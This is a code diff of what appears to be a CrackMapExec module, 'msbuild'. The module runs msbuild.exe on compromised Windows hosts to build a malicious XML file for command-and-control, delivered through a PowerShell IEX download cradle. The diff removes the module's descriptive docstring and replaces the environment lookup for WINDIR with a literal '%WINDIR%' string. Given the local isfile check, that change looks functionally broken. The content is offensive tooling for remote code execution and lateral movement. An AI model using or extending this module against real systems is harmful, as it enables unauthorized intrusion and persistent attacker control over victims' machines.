@@ -3,8 +3,6 @@
 import os
 class CMEModule:
     '''
-        Executes msbuild to build a malicious .xml file for C2 purposes.
-        Module by @lolcatlolcat
 
     '''
     name = 'msbuild'
@@ -31,13 +29,13 @@ class CMEModule:
 
     def on_login(self, context, connection):
         if self.arch == 'x64':
-            winders = os.path.join(os.environ['WINDIR'], "Microsoft.NET", "Framework64", self.ver, "msbuild.exe")
+            winders = os.path.join("%WINDIR%", "Microsoft.NET", "Framework64", self.ver, "msbuild.exe")
             if os.path.isfile(winders):
                 command = '{} {}'.format(winders, self.filename)
                 cradle = gen_ps_iex_cradle(context, self.filename, command)
 
         elif self.arch == 'x86':
-            winders = os.path.join(os.environ['WINDIR'], "Microsoft.NET", "Framework", self.ver, "msbuild.exe")
+            winders = os.path.join("%WINDIR%", "Microsoft.NET", "Framework", self.ver, "msbuild.exe")
             if os.path.isfile(winders):
                 command = '{} {}'.format(winders, self.filename)
                 cradle = gen_ps_iex_cradle(context, self.filename, command)
